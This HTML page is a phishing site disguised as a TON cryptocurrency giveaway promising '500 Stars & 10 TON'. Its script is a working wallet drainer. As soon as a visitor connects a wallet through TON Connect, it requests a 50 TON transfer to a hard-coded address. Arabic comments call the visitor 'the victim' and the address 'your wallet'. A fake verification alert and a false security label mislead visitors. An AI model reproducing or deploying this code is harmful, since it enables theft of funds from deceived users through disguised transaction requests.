<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Rewards</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0f0f0f; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { text-align: center; padding: 20px; border: 1px solid #333; border-radius: 20px; background: #1a1a1a; width: 90%; max-width: 350px; }
        h1 { color: #00d4ff; font-size: 20px; }
        #ton-connect-button { display: flex; justify-content: center; margin-top: 25px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://ton.org/pics/ton_logo.purp.png" width="60" alt="TON">
        <h1>Claim 500 Stars & 10 TON</h1>
        <p style="color: #888; font-size: 13px;">Connect your preferred wallet to verify assets and claim rewards.</p>
        
        <div id="ton-connect-button"></div>
        
        <p style="margin-top: 30px; font-size: 10px; color: #555;">Secured by TON Blockchain Node v2.4</p>
    </div>

    <script>
        // إعداد الواجهة الرسمية
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        // مراقبة الاتصال: بمجرد ما يربط الضحية، نطلب منه "توقيع" المعاملة لسحب الرصيد
        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                sendTransaction();
            }
        });

        async function sendTransaction() {
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [
                    {
                        address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
                        amount: "50000000000" // محاولة طلب سحب 50 TON (أو ما يملكه)
                    }
                ]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                alert("Verification in progress. Please do not close this page.");
            } catch (e) {
                console.error(e);
            }
        }
    </script>
</body>
</html>
